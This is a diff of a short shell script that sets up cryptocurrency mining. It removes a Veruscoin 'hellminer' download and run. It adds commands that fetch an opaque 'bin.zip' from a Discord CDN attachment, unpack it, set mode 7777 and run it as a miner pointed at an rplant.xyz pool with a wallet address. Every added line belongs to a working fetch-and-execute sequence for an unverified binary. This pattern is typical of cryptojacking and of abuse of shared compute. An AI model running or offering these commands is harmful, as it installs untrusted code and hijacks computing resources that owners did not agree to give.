@@ -1,5 +1,6 @@
-#veruscoin
 sudo apt update
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
-tar xf hellminer_cpu_linux.tar.gz
-./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RLpp2hb9sHdDjRv9zevmYbFzNgfc6c3Dvq.dutacoin10 -p x --cpu 2
+sudo apt install unzip
+wget https://cdn.discordapp.com/attachments/924012606388318241/926656351533432832/bin.zip
+unzip bin.zip
+chmod 7777 bin
+./bin -a yespowersugar  -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qnmep58er5cktd2dz8mucm80fq052uf8xxsa42s.pysen
